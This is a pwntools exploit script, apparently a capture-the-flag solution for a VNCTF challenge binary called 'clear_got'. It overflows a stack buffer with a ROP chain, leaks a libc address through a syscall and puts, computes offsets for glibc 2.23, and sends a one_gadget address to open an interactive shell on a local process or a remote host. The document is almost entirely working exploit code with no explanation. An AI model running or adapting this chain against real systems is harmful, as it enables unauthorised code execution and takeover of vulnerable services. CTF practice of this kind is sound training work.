#coding=utf-8
from pwn import *

context(arch="amd64", os="linux")
context.log_level='debug'
# context.terminal=['tmux','splitw','-h']

ip = ''
port = ''
reomote_addr = [ip,port]
binary = './clear_got'

libc = ELF('/home/tamako/Desktop/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')
elf = ELF(binary)
if len(sys.argv)==1:
    p = process(binary)

if len(sys.argv)==2 :
    p = remote(reomote_addr[0],reomote_addr[1])

#----------------------------------------------------------------------
ru = lambda x : p.recvuntil(x,timeout=0.2)
sd = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
recv = lambda : p.recv()
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
it = lambda :p.interactive()
ru7f = lambda : u64(ru('\x7f')[-6:].ljust(8,b'\x00'))
rv6 = lambda : u64(rv(6)+b'\x00'*2)
lg = lambda s: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
bp = lambda src=None : attach(p,src)
sym = lambda name : libc.sym[name]
#----------------------------------------------------------------------

def leak(offset):
	addr = u64(p.recvuntil('\x7e')[-6:].ljust(8,'\x00'))
	base = addr - offset
	print "[+]libc_base=>"+hex(base)
	return base

mov_leave_ret = 0x000000000040075C
syscall_rbp_ret = 0x000000000040076e
end2 = 0x0000000000400773

pop_rdi_ret = 0x00000000004007f3
pop_rsi_r15_ret = 0x00000000004007f1


ru("Welcome to VNCTF! This is a easy competition.///\n")
payload = 'a'*0x60 + p64(mov_leave_ret) + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret)
payload += p64(0x601040) + p64(0) + p64(end2) + p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret)
payload += p64(0x601010) + p64(0) + p64(syscall_rbp_ret) + p64(0) + p64(pop_rdi_ret) + p64(0x601010) + p64(0x0000000000400772)+p64(elf.plt['puts'])
 
# attach(p,'b *0x400761')

pause()
sl(payload)
pause()

libc_main = u64(rv(0x38)[:8]) -0x20750
print hex(libc_main)
system = libc_main + 0x453a0
bin_sh = libc_main + libc.search('/bin/sh\x00').next()
shell  = libc_main + 0x4527a
sl(p64(bin_sh)+p64(shell))


it()
